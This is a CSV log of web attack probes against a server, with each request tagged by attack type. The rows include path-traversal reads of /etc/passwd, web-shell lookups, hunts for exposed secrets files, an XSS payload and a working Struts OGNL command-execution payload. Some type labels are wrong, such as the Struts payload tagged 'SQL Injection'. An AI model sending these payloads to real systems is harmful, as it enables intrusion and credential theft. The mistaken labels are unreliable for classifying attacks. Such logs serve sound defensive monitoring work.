timestamp,ip,method,url,status,attack_type,user_agent
2025-05-21 05:50:14,173.239.196.15,GET,/storage/etc/hosts,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:14,173.239.196.12,GET,/storage/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:20,173.239.196.9,GET,/storage/images/c99.php,404,Common Web Shell Access,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:26,173.239.196.9,GET,/storage/mailer/.env,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:31,173.239.196.12,GET,/storage/old.htaccess,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:32,173.239.196.15,GET,/storage/painel/config/config.php.example,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:34,173.239.196.10,GET,/storage/phpinfo.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:34,173.239.196.10,GET,/storage/phpinfo.php3,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:34,173.239.196.15,GET,/storage/phpinfo.php4,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:34,173.239.196.12,GET,/storage/phpinfo.php5,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:39,173.239.196.13,GET,/storage/r57.php,404,Common Web Shell Access,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:40,173.239.196.15,GET,/storage/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:40,173.239.196.15,GET,/storage/remote/fgt_lang?lang=/../../../../////////////////////////bin/sslvpnd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:40,173.239.196.12,GET,/storage/resolute.php?img=config.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:42,173.239.196.14,GET,/storage/secrets.env,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:42,173.239.196.9,GET,/storage/sendgrid.env,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:48,173.239.196.10,GET,/storage/system/expressionengine/config/config.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:49,173.239.196.14,GET,/storage/text-base/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:50,173.239.196.9,GET,/storage/twitter/.env,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:53,173.239.196.15,GET,/storage/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.11,GET,/storage/wp-admin/admin-ajax.php,404,Broken Access Control (Forced Browsing),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-admin/install.php,404,Broken Access Control (Forced Browsing),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.15,GET,/storage/wp-admin/setup-config.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.12,GET,/storage/wp-admin/,404,Broken Access Control (Forced Browsing),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.13,GET,/storage/wp-config.php,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.10,GET,/storage/wp-config.php-bak,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.14,GET,/storage/wp-config.php.0,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-config.php.1,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.10,GET,/storage/wp-config.php.2,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-config.php.3,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.13,GET,/storage/wp-config.php.5,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.11,GET,/storage/wp-config.php.4,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-config.php.6,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.14,GET,/storage/wp-config.php.7,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.12,GET,/storage/wp-config.php.8,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.11,GET,/storage/wp-config.php.backup,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.13,GET,/storage/wp-config.php.bak,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.15,GET,/storage/wp-config.php.bk,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-config.php.9,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.15,GET,/storage/wp-config.php.bak1,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.14,GET,/storage/wp-config.php.dist,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.15,GET,/storage/wp-config.php.new,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.12,GET,/storage/wp-config.php.cust,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.11,GET,/storage/wp-config.php.inc,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.11,GET,/storage/wp-config.php.disabled,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.13,GET,/storage/wp-config.php.old,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.13,GET,/storage/wp-config.php.original,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.10,GET,/storage/wp-config.php.swn,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.11,GET,/storage/wp-config.php.orig,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.14,GET,/storage/wp-config.php.swp,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.10,GET,/storage/wp-config.php.swo,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-config.php.save,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-config.php.zip,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-config.php.txt,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.14,GET,/storage/wp-config.php_bak,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.10,GET,/storage/wp-config.php_,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.13,GET,/storage/wp-config.php_1,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.11,GET,/storage/wp-config.php_new,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.9,GET,/storage/wp-config.php_Old,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:56,173.239.196.11,GET,/storage/wp-config.php~,404,Sensitive Data Exposure Probe,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:57,173.239.196.9,GET,/storage/wps/cmis_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,404,Remote File Inclusion (RFI),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:57,173.239.196.12,GET,/storage/wps/common_proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,404,Remote File Inclusion (RFI),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:57,173.239.196.10,GET,/storage/wps/contenthandler/!ut/p/digest!8skKFbWr_TwcZcvoc9Dn3g/?uri=http://www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,404,Remote File Inclusion (RFI),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:57,173.239.196.9,GET,/storage/wps/myproxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,404,Remote File Inclusion (RFI),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:57,173.239.196.11,GET,/storage/wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://example.com,404,Remote File Inclusion (RFI),"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:57,173.239.196.14,GET,/storage/WSO.php,404,Common Web Shell Access,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:50:57,173.239.196.9,GET,/storage/wso.php,404,Common Web Shell Access,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88"
2025-05-21 05:51:23,104.248.99.110,GET,/vpn/user/download/client?ostype=../../../../../../../../../etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (Knoppix; Linux i686; rv:128.0) Gecko/20100101 Firefox/128.0
2025-05-21 05:51:23,104.248.99.110,GET,/export/classroom-course-statistics?fileNames[]=../../../../../../../etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16."
2025-05-21 05:51:23,104.248.99.110,GET,/?lang=../../../../../usr/local/php/pearcmd,200,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
2025-05-21 05:51:23,104.248.99.110,GET,/index.php?sl=../../../../../../../etc/passwd%00,200,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (Kubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
2025-05-21 05:51:23,104.248.99.110,GET,/index.action?redirect%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D,302,SQL Injection,Mozilla/5.0 (Debian; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
2025-05-21 05:51:23,104.248.99.110,GET,/index.action?action%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D,302,SQL Injection,Mozilla/5.0 (Windows NT 10.0; rv:88.0) Gecko/20100101 Firefox/88.0
2025-05-21 05:51:24,104.248.99.110,GET,/index.action?redirectAction%3A%24%7B%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3Dfalse%2C%23f%3D%23%5FmemberAccess.getClass().getDeclaredField(%22allowStaticMethodAccess%22)%2C%23f.setAccessible(true)%2C%23f.set(%23%5FmemberAccess%2Ctrue)%2C%23a%3D%40java.lang.Runtime%40getRuntime().exec(%22sh%20-c%20id%22).getInputStream()%2C%23b%3Dnew%20java.io.InputStreamReader(%23a)%2C%23c%3Dnew%20java.io.BufferedReader(%23b)%2C%23d%3Dnew%20char%5B5000%5D%2C%23c.read(%23d)%2C%23genxor%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22).getWriter()%2C%23genxor.println(%23d)%2C%23genxor.flush()%2C%23genxor.close()%7D,302,SQL Injection,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-21 05:51:24,104.248.99.110,GET,/wp-content/plugins/dhtmlxspreadsheet/codebase/spreadsheet.php?page=%3Cscript%3Ealert(document.domain)%3C/script%3E,404,Cross-Site Scripting (XSS),"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3"
2025-05-21 05:51:24,104.248.99.110,GET,/wp-content/plugins/post-pdf-export/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17."
2025-05-21 05:51:24,104.248.99.110,GET,/wp-content/plugins/web-portal-lite-client-portal-secure-file-sharing-private-messaging/includes/libs/pdf/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (ZZ; Linux i686; rv:125.0) Gecko/20100101 Firefox/125.0
2025-05-21 05:51:24,104.248.99.110,GET,/wp-content/plugins/buddypress-component-stats/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (Kubuntu; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0
2025-05-21 05:51:24,104.248.99.110,GET,/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/617.18 (KHTML, like Gecko) Version/17.4 Safar"
2025-05-21 05:51:24,104.248.99.110,GET,/wp-content/plugins/blogtopdf/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0."
2025-05-21 05:51:24,104.248.99.110,GET,/wp-content/plugins/wp-ecommerce-shop-styling/includes/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:88.0) Gecko/20100101 Firefox/88.0
2025-05-21 05:51:24,104.248.99.110,GET,/wp-content/plugins/abstract-submission/dompdf-0.5.1/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (Knoppix; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
2025-05-21 05:51:24,104.248.99.110,GET,/lib/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1) AppleWebKit/618.27 (KHTML, like Gecko) Version/17.4 Saf"
2025-05-21 05:51:24,104.248.99.110,GET,/PhpSpreadsheet/Writer/PDF/DomPDF.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537"
2025-05-21 05:51:24,104.248.99.110,GET,/wp-content/plugins/gboutique/library/dompdf/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/53"
2025-05-21 05:51:24,104.248.99.110,GET,/dompdf.php?input_file=php://filter/resource=/etc/passwd,404,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
2025-05-21 05:51:24,104.248.99.110,GET,/etc/passwd,400,Local File Inclusion (LFI) / Path Traversal,-
2025-05-21 05:51:24,104.248.99.110,GET,/cgi-bin/stats,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Saf"
2025-05-21 05:51:24,104.248.99.110,GET,/cgi-bin/test,404,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.18"
2025-05-21 05:51:24,104.248.99.110,GET,/test.cgi,302,Local File Inclusion (LFI) / Path Traversal,"Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537"
2025-05-21 05:51:24,104.248.99.110,GET,/cgi-bin/status,404,Local File Inclusion (LFI) / Path Traversal,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0
